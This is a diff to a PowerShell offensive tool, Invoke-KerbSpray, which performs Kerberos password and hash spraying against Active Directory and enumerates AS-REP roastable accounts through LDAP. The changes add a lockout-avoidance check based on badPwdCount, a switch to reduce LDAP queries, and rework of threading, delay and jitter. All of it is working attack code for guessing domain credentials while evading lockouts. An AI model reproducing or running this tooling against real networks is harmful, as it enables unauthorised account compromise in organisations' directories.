@@ -41,6 +41,9 @@ function Invoke-KerbSpray {
 .PARAMETER LdapPass
     Specifies the password to use for LDAP bind.
 
+.PARAMETER NoOldPwd
+    Disables old password discovery to reduce the number of LDAP queries.
+
 .PARAMETER LockoutThreshold
     Specifies the maximum value of the badPwdCount attribute of the target users enumerated via LDAP.
 
@@ -111,6 +114,9 @@ function Invoke-KerbSpray {
 
         [String]
         $LdapPass,
+
+        [Switch]
+        $NoOldPwd,
 
         [Int]
         $LockoutThreshold = 2,
@@ -193,15 +199,12 @@ function Invoke-KerbSpray {
     if ($Username) {
         if ($Ldap) {
             $filter = "(samAccountName=$Username)"
-            $user = Get-LdapObject -ADSpath $ADSpath -Filter $filter -LdapUser $LdapUser -LdapPass $LdapPass | Select samAccountName,badPwdCount
-            if ($user) {
-                $badPwdCount = $user.badPwdCount
+            $badPwdCount = (Get-LdapObject -ADSpath $ADSpath -Filter $filter -Properties badPwdCount -LdapUser $LdapUser -LdapPass $LdapPass).badPwdCount
+            if ($badPwdCount -eq $null) {
+                Write-Error "$($username)@$($Domain) does not exist" -ErrorAction Stop
             }
         }
-        if ($Ldap -and -not $user) {
-            Write-Error "$($username)@$($Domain) does not exist"
-        }
-        else {
+        if ($badPwdCount -ne $null -or -not $Ldap) {
             $cred = @{Username = $Username; Password = $Password; Hash = $Hash; BadPwdCount = $badPwdCount}
             $credentials.add($cred) | Out-Null
         }
@@ -211,15 +214,12 @@ function Invoke-KerbSpray {
         ForEach ($username in Get-Content $UserFilePath) {
             if ($Ldap) {
                 $filter = "(samAccountName=$username)"
-                $user = Get-LdapObject -ADSpath $ADSpath -Filter $filter -LdapUser $LdapUser -LdapPass $LdapPass | Select samAccountName,badPwdCount
-                if ($user) {
-                    $badPwdCount = $user.badPwdCount
+                $badPwdCount = (Get-LdapObject -ADSpath $ADSpath -Filter $filter -Properties badPwdCount -LdapUser $LdapUser -LdapPass $LdapPass).badPwdCount
+                if ($badPwdCount -eq $null) {
+                    Write-Verbose "$($username)@$($Domain) does not exist"
                 }
             }
-            if ($Ldap -and -not $user) {
-                Write-Verbose "$($username)@$($Domain) does not exist"
-            }
-            else {
+            if ($badPwdCount -ne $null -or -not $Ldap) {
                 $cred = @{Username = $username; Password = $Password; Hash = $Hash; BadPwdCount = $badPwdCount}
                 $credentials.add($cred) | Out-Null
             }
@@ -249,12 +249,12 @@ function Invoke-KerbSpray {
         if (-not ($Password -or $Hash)) {
             # Find all enabled users without kerberos preauthentication enabled (AS-REP roasting)
             $filter = "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)$filter)"
-            $users = Get-LdapObject -ADSpath $ADSpath -Filter $filter -LdapUser $LdapUser -LdapPass $LdapPass | Select samAccountName,badPwdCount
+            $users = Get-LdapObject -ADSpath $ADSpath -Filter $filter -Properties sAMAccountName,badPwdCount -LdapUser $LdapUser -LdapPass $LdapPass
         }
         else {
             # Find all enabled users with badPwdCount < LockoutThreshold (spraying)
             $filter = "(&(samAccountType=805306368)(!badPwdCount>=$LockoutThreshold)$filter)"
-            $users = Get-LdapObject -ADSpath $ADSpath -Filter $filter -LdapUser $LdapUser -LdapPass $LdapPass | Select samAccountName,badPwdCount
+            $users = Get-LdapObject -ADSpath $ADSpath -Filter $filter -Properties sAMAccountName,badPwdCount -LdapUser $LdapUser -LdapPass $LdapPass
         }
         ForEach ($user in $users) {
             $cred = @{Username = $user.samAccountName; Password = $Password; Hash = $Hash; BadPwdCount = $user.badPwdCount}
@@ -269,19 +269,23 @@ function Invoke-KerbSpray {
         Domain = $Domain
         Server = $Server
         ADSpath = $ADSpath
+        Delay = $Delay
+        Jitter = $Jitter
         Ldap = $Ldap
         LdapUser = $LdapUser
         LdapPass = $LdapPass
+        NoOldPwd = $NoOldPwd
+        LockoutThreshold = $LockoutThreshold
         BloodHound = $BloodHound
         Credential = $Credential
         Neo4jHost = $Neo4jHost
         Neo4jPort = $Neo4jPort
         Verbose = $VerbosePreference
     }
-    if ($PSBoundParameters['Delay']) {
-        New-KerberosSpray @params -Collection $credentials -Delay $Delay -Jitter $Jitter
+    if ($PSBoundParameters['Delay'] -or $credentials.Count -eq 1) {
+        New-KerberosSpray @params -Collection $credentials
     }
-    else {
+    elseif ($credentials) {
         New-ThreadedFunction -ScriptBlock ${function:New-KerberosSpray} -ScriptParameters $params -Collection $credentials.ToArray() -Threads $Threads
     }
 }
@@ -299,10 +303,10 @@ function Local:New-KerberosSpray {
         $Server,
 
         [UInt32]
-        $Delay = 0,
+        $Delay,
 
         [Double]
-        $Jitter = 0.3,
+        $Jitter,
 
         [Switch]
         $Ldap,
@@ -312,6 +316,12 @@ function Local:New-KerberosSpray {
 
         [String]
         $LdapPass,
+
+        [Switch]
+        $NoOldPwd,
+
+        [Int]
+        $LockoutThreshold,
 
         [String]
         $ADSpath,
@@ -330,7 +340,11 @@ function Local:New-KerberosSpray {
     )
 
     ForEach ($cred in $Collection) {
-        if ($cred.Password) {
+        if ($cred.Password -or $cred.Hash -and $cred.badPwdCount -ge $LockoutThreshold) {
+            Write-Host "[!] Skipping user $($cred.Username)@$Domain because its 'badPwdCount' is $($cred.badPwdCount) (> $LockoutThreshold)"
+            continue
+        }
+        elseif ($cred.Password) {
             # Kerberos preauthentication using plain-text password (bruteforce)
             $asn_AS_REP = New-KerbPreauth -UserName $cred.Username -Password $cred.Password -Domain $Domain -Server $Server
         }
@@ -388,9 +402,9 @@ function Local:New-KerberosSpray {
                 24 {
                     $output = "$($cred.Username)@$($Domain) failed to authenticate"
                     $newBadPwdCount = $null
-                    if ($Ldap) {
+                    if ($Ldap -And -Not $NoOldPwd) {
                         $filter = "(samAccountName=$($cred.Username))"
-                        $newBadPwdCount = (Get-LdapObject -ADSpath $ADSpath -Filter $filter -LdapUser $LdapUser -LdapPass $LdapPass).badPwdCount
+                        $newBadPwdCount = (Get-LdapObject -ADSpath $ADSpath -Filter $filter -Properties badPwdCount -LdapUser $LdapUser -LdapPass $LdapPass).badPwdCount
                     }
                     if (($newBadPwdCount -ne $null) -and ($newBadPwdCount -eq $cred.BadPwdCount)) {
                             Write-Host "[?] $output [old password]"
@@ -827,6 +841,10 @@ function Local:Get-LdapObject {
         [String]
         $Filter,
 
+        [ValidateNotNullOrEmpty()]
+        [String[]]
+        $Properties = '*',
+
         [ValidateRange(1,10000)] 
         [Int]
         $PageSize = 200,
@@ -848,7 +866,8 @@ function Local:Get-LdapObject {
     $searcher.PageSize = $PageSize
     $searcher.CacheResults = $false
     $searcher.filter = $Filter
-    $searcher.PropertiesToLoad.Add('*') | Out-Null
+    $propertiesToLoad = $Properties | ForEach-Object {$_.Split(',')}
+    $searcher.PropertiesToLoad.AddRange($propertiesToLoad) | Out-Null
     Try {
         $results = $searcher.FindAll()
         $results | Where-Object {$_} | ForEach-Object {
